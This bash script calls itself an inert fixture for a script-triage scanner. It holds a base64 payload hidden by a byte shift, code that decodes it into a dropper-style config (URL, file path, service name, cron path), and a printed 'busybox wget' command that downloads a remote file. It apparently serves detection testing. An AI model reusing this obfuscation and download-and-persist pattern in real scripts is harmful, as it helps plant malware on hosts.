#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_da1cb8fa='hk1BjIOEdYCDTXFzgYV5gnVvgnV9f4R1PIeCeYR1b3Z5fHWMcXRxgIR1gk1yhYOJcn+Ib4d3dYRvf4WEgIWEjIOEcXd1b3N/hX6ETUGMc3F9gHF5d35veXRNc3F9gHF5d349dHRHQUlGQnJHdoyFgnxNeISEgINKPz90dEdBSUZCckd2PnWIcX2AfHU+eX6GcXx5dD9IRXVFR0VAcj6DeIyFg3WCb3F3dX6ETViFfoSCdYODXHFyP3R0R0FJRkJyR3aMdnl8dW+AcYR4TT+EfYA/eIV+hIJ1g4M9c3FzeHU/PoOEcXd1PXR0R0FJRkJyR3Y='
readonly Codec_da1cb8fa='base64_literal|add_modulo_256|10'

Load_da1cb8fa() {
  stored_bytes=()
  local encoded_part
  while read -r encoded_part; do [[ -n "$encoded_part" ]] && stored_bytes+=("$encoded_part"); done < <(printf '%s' "${Material_da1cb8fa}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_da1cb8fa() {
  recovered_bytes=()
  local byte_index
  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
    recovered_bytes+=("$(((stored_bytes[byte_index] - 16 + 256) % 256))")
  done
}

Recover_da1cb8fa() {
  local -a stored_bytes recovered_bytes
  local configuration_text harmless_value decode_pass byte_index
  harmless_value="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_da1cb8fa
  case 1 in 1) Decode_da1cb8fa ;; *) return 70 ;; esac
  configuration_text=''
  local octal character
  for byte_index in "${!recovered_bytes[@]}"; do
    printf -v octal '%03o' "${recovered_bytes[byte_index]}"
    printf -v character '%b' "\\$octal"
    configuration_text+="$character"
  done
  printf '%s\n' "$configuration_text"
}

Inspect_da1cb8fa() { Recover_da1cb8fa; }

Plan_da1cb8fa() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_da1cb8fa)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(busybox wget -qO "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_da1cb8fa; fi
